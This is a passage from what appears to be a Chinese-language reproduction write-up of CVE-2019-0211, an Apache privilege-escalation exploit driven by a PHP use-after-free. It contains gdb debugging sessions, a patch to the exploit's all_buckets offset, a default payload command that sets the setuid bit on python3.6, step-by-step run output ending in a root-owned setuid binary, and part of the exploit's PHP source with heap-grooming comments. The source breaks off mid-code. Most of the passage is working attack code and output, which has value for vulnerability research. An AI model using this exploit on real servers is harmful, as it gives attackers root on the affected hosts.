      PID matches
      Changed bucket value to -18002
      Ranges: 0x7f2847b501c0 - 0x7f2847b607b0
    EXPLOIT SUCCESSFUL.
    Await 6:25AM.
    root# gdb attach 30073
    gdb-peda$ p all_buckets 
    $1 = (prefork_child_bucket *) 0x7f2847b501d0
    # 这里看的exp找的的all_bucket地址是没有问题的
    gdb-peda$ p ap_scoreboard_image->parent[0]
    $2 = {
      pid = 0x757a, 
      generation = 0x0, 
      quiescing = 0x0, 
      not_accepting = 0x0, 
      connections = 0x0, 
      write_completion = 0x0, 
      lingering_close = 0x0, 
      keep_alive = 0x0, 
      suspended = 0x0, 
      bucket = 0xffffb9ae
    }
    # pid 0x757a=30074 也是执行exp的worker进程pid
    # bucket 也已经成功修改为-18002
    gdb-peda$ p $index = ap_scoreboard_image->parent[0]->bucket
    $3 = 0xffffb9ae
    gdb-peda$ p all_buckets[$index]
    $4 = {
      pod = 0x7f2847ae69d8, 
      listeners = 0x7f2847ae69d8, 
      mutex = 0x7f2847ae69d8
    }
    # 这里看到一旦all_bucket[$index]命中堆喷射的区域，就会读取伪造的prefork_child_bucket，它的三个指针都会被设置为properties的地址
    gdb-peda$ detach
引用一张图，很好的描述了利用成功时的内存布局：
####  其他说明
1.漏洞利用的关键点  
SHM内存区域位于php内存下方(高地址)，才能通过PHP代码读写SHM内存  
all_buckets位于php内存下方，才能通过PHP代码找的all_buckets地址  
apache greaceful 重启后，all_buckets的地址会产生偏移
2.all_buckets地址在apache greaceful restart后会改变，作者的环境只有几个字节的偏差，但是我的测试环境偏移很大：
    # 几次apache graceful restart前后的偏移情况
    >>> hex(0x7f02d6bd11d0 - 0x7f02d6bb71d0)
    '0x1a000'
    >>> hex(0x7fbaf3eff1d0 - 0x7fbaf3ee51d0)
    '0x1a000'
    >>> hex(0x7f81814a31d0 - 0x7f81814891d0)
    '0x1a000'
    >>>
如果要成功利用需要修改exp：
    $bucket_index_middle = (int) (
                - ($all_buckets + 0x1a000 - $spray_middle) /
                $size_prefork_child_bucket
            );
另外，测偏移的方法：
    # shell 1
    $ ps -aux|grep apache
    root      25990  0.0  1.8 320264 36456 ?        Ss   20:48   0:00 /usr/sbin/apache2 -k start
    ...
    $ sudo gdb attach 25990
    p all_buckets
    b make_child
    c
    #shell 2
    sudo apachectl graceful
    # shell 1
    c
    p all_buckets
3.作者exp中UAF的这两句话在我的环境没有效果，复现exp中删掉了
    if(version_compare(PHP_VERSION, '7.2') >= 0)
        $room[] = "!$_protector";
4.测试环境是Ubuntu18 ，自带的python3.6，默认的cmd改了一下
        $bucket = isset($_REQUEST['cmd']) ?
            $_REQUEST['cmd'] :
            "chmod +s /usr/bin/python3.6";
####  复现
Step1 – 下载exp，拷贝到web目录
    $ cp exp.php /var/www/html/
Step2 – 执行exp
    $ curl localhost/exp.php
    CARPE (DIEM) ~ CVE-2019-0211
    PID: 27115
    Fetching addresses
      zend_object_std_dtor: 0x7f2ff4939fb0
      system: 0x7f2ff7826440
      libaprX: 0x7f2ff7de7000-0x0x7f2ff7e1a000
      libaprR: 0x7f2ff801a000-0x0x7f2ff801b000
      shm: 0x7f2ff85b8000-0x0x7f2ff85cc000
      apache: 0x7f2ff85fd000-0x0x7f2ff86e0000
    Obtaining apache workers PIDs
      Found apache worker: 27113
      Found apache worker: 27114
      Found apache worker: 27115
      Found apache worker: 27116
      Found apache worker: 27117
    Got 5 PIDs.
    Triggering UAF
      Creating room and filling empty spaces
      Allocating $abc and $p
      Unsetting both variables and setting $protector
      Creating DateInterval object
    UAF successful.
    Address of $abc: 0x7f2fefe9a4e8
    Looking for all_buckets in memory
      [&mutex]: 0x7f2ff863f1e0
        [mutex]: 0x7f2ff863f330
          [meth]: 0x7f2ff801ab60
            [*]: 0x7f2ff7e020d0
            [*]: 0x7f2ff7e02070
            [*]: 0x7f2ff7e02010
            [*]: 0x7f2ff7e01fb0
            [*]: 0x7f2ff7e01b30
            [*]: 0x7f2ff7e01810
            [*]: 0x7f2ff7e01f40
    all_buckets = 0x7f2ff863f1d0
    Computing potential bucket indexes and addresses
    Placing payload at address 0x7f2ff85bc148
    Spraying pointer
      Address: 0x7f2ff85bc218
      From: 0x7f2ff85bc250
      To: 0x7f2ff85cc000
      Size: 0xfdb0
      Covered: 0x4f470
      Apache: 0xe3000
    Iterating in SHM to find PIDs...
    Got PID: 27113
      PID matches
      Changed bucket value to -32201
      Ranges: 0x7f2ff8678d28 - 0x7f2ff8688ad8
    Got PID: 27114
      PID matches
      Changed bucket value to -29495
      Ranges: 0x7f2ff8668f78 - 0x7f2ff8678d28
    Got PID: 27115
      PID matches
      Changed bucket value to -26789
      Ranges: 0x7f2ff86591c8 - 0x7f2ff8668f78
    Got PID: 27116
      PID matches
      Changed bucket value to -24083
      Ranges: 0x7f2ff8649418 - 0x7f2ff86591c8
    Got PID: 27117
      PID matches
      Changed bucket value to -21377
      Ranges: 0x7f2ff8639668 - 0x7f2ff8649418
    EXPLOIT SUCCESSFUL.
    Await 6:25AM.
Step3 – 手动重启Apache(模拟logrotate的每日自动重启)
    $ sudo apachectl graceful
Step4 – 查看利用效果
    $ ls -l /usr/bin/python3.6
    -rwsr-sr-x 1 root root 4526456 Nov  7  2019 /usr/bin/python3.6
## 5\. 复现环境EXP
     &$y]);
    }
    # In order to read/write what comes after in memory, we need to UAF a string so
    # that we can control its size and make in-place edition.
    # An easy way to do that is to replace the string by a timelib_rel_time
    # structure of which the first bytes can be reached by the (y, m, d, h, i, s)
    # properties of the DateInterval object.
    #
    # Steps:
    # - Create a base object (Z)
    # - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)
    # - Create DateInterval object ($place) meant to be unset and filled by another
    # - Trigger the UAF by unsetting $y[0], which is still reachable using $this
    # - Unset $place: at this point, if we create a new DateInterval object, it will
    #   replace $place in memory
    # - Create a string ($holder) that fills $place's timelib_rel_time structure
    # - Allocate a new DateInterval object: its timelib_rel_time structure will
    #   end up in place of abc
    # - Now we can control $this->abc's zend_string structure entirely using
    #   y, m, d etc.
    # - Increase abc's size so that we can read/write memory that comes after it,
    #   especially the shared memory block
    # - Find out all_buckets' position by finding a memory region that matches the
    #   mutex->meth structure
    # - Compute the bucket index required to reach the SHM and get an arbitrary
    #   function call
    # - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the
    #   bucket
    class Z implements JsonSerializable
    {
        public function jsonSerialize()
        {
            global $y, $addresses, $workers_pids;
            #
            # Setup memory
            #
            o('Triggering UAF');
            o('  Creating room and filling empty spaces');
            # Fill empty blocks to make sure our allocations will be contiguous
            # I: Since a lot of allocations/deallocations happen before the script
            # is ran, two variables instanciated at the same time might not be
            # contiguous: this can be a problem for a lot of reasons.
            # To avoid this, we instanciate several DateInterval objects. These
            # objects will fill a lot of potentially non-contiguous memory blocks,
            # ensuring we get "fresh memory" in upcoming allocations.
            $contiguous = [];
            for($i=0;$iabc = ptr2str(0, 79);
            # Create $p meant to protect $this's blocks
            # I: Right after we trigger the UAF, we will unset $p.
            # This means that the timelib_rel_time structure (TRT) of this object
            # will be freed. We will then allocate a string ($protector) of the same
            # size as TRT. Since PHP's heap is LIFO, the string will take the place
            # of the now-freed TRT in memory.
            # Then, we create a new DateInterval object ($x). From the same
            # assumption, every structure constituting this new object will take the
            # place of the previous structure. Nevertheless, since TRT's memory
            # block has already been replaced by $protector, the new TRT will be put
            # in the next free blocks of the same size, which happens to be $abc
            # (remember, |abc| == |timelib_rel_time|).
            # We now have the following situation: $x is a DateInterval object whose
            # internal TRT structure has the same address as $abc's zend_string.
            $p = new DateInterval('PT1S');
            #
            # Trigger UAF
            #
            o('  Unsetting both variables and setting $protector');
            # UAF here, $this is usable despite being freed
            unset($y[0]);
            # Protect $this's freed blocks
            unset($p);
            # Protect $p's timelib_rel_time structure
            $protector = ".$_protector";
            # !!! This is only required for apache
            # Got no idea as to why there is an extra deallocation (?)
            o('  Creating DateInterval object');
            # After this line:
            # &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str
            # We can control the structure of $this->abc and therefore read/write